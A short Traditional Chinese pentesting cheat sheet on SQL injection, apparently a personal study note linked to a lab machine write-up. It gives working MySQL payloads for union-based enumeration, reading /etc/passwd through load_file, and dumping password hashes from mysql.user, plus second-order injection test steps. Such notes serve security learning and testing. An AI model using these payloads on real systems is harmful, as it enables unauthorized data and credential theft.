# SQL 注入 (SQLi)
SQL Injection (SQLi) 是一種將惡意 SQL 程式碼插入到應用程式的輸入參數中，使後端資料庫將其誤認為合法指令並加以執行的安全漏洞。

# 常見技術與測試手法

## 1. Union-Based SQLi (聯合查詢注入)
當資料庫查詢結果會直接反射（回顯）在網頁畫面上時使用。
```sql
# 1. 欄位數判定 (使用 ORDER BY 遞增直至報錯，或使用 UNION SELECT 遞增測試)
' order by 4-- -
' union select 1,2,3,4-- -

# 2. 資訊枚舉 (獲取資料庫名稱、使用者名稱)
' union select 1,database(),user(),4-- -

# 3. 跨庫查詢 (獲取表名與欄位名)
' union select 1,table_name,3,4 from information_schema.tables where table_schema=database()-- -
' union select 1,column_name,3,4 from information_schema.columns where table_name='users'-- -
```

## 2. Second-Order SQLi (二階 SQL 注入)
惡意 Payload 在第一階段輸入時被安全地存入資料庫（可能進行了防護，但沒有參數化），但在第二階段，後台背景程式（如 Cron 定時任務、郵件警報、報表統計）從資料庫取出該資料並直接拼接執行時，引發 SQL 注入。
*   **測試流程**：
    1.  **注入點寫入**：在寫入點（如註冊帳號、新增項目）提交閉合 Payloads。
    2.  **觸發點執行**：執行會呼叫該資料的背景或前端功能，觸發執行。
    3.  **回顯點查閱**：在二次回顯位置（如電子郵箱、管理面板列表）檢視執行結果。

## 3. 檔案讀取 (LFI via SQLi)
如果資料庫帳號具有 `FILE` 權限且 `secure_file_priv` 未設限，可讀取系統檔案：
```sql
' union select 1,load_file('/etc/passwd'),3,4-- -
```

## 4. 系統表 Dump (mysql.user)
可用來導出資料庫自身的帳密 Hash：
```sql
' union select 1,user,password,authentication_string from mysql.user-- -
```

---

# 實戰關聯
*   **靶機應用實例**：[[InsanityHosting]]（利用雙引號 `"` 閉合的二階 SQL 注入，配合警報信件回顯，成功讀取本地 `/etc/passwd` 以及導出 `mysql.user` 表中的 `elliot` 憑證）。
